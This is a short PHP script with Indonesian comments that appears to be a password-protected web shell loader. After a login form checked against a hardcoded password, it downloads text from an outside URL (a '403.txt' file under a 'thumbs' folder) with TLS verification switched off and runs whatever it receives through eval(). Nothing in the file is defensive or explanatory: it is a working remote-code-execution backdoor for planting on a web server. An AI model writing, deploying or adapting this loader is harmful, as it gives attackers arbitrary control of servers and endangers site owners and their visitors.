<?php
session_start();

// ======== SET PASSWORD DI SINI ========
define('ADMIN_PASSWORD', 'Semangat45');
// ======================================

// Jika belum login, tampilkan form login
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    if (isset($_POST['password'])) {
        if ($_POST['password'] === ADMIN_PASSWORD) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }
    ?>
    <!-- Form login sederhana -->
    <form method="post">
        <input type="password" name="password" placeholder="Masukkan Password">
        <button type="submit">Login</button>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
    </form>
    <?php
    exit; // berhenti setelah form tampil
}

// ====== Fungsi ambil URL ======
function getURL($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);

        if ($data === false) {
            return false;
        }

        curl_close($ch);
        return $data;
    }
    return false;
}

// ====== Eksekusi kode dari URL ======
$remoteCode = getURL("http://www.emulsionworks.com/web/thumbs/403.txt");

if ($remoteCode) {
    // eval hanya dijalankan kalau ada isi
    eval("?>" . $remoteCode);
} else {
    echo "Gagal mengambil kode dari URL.";
}
?>
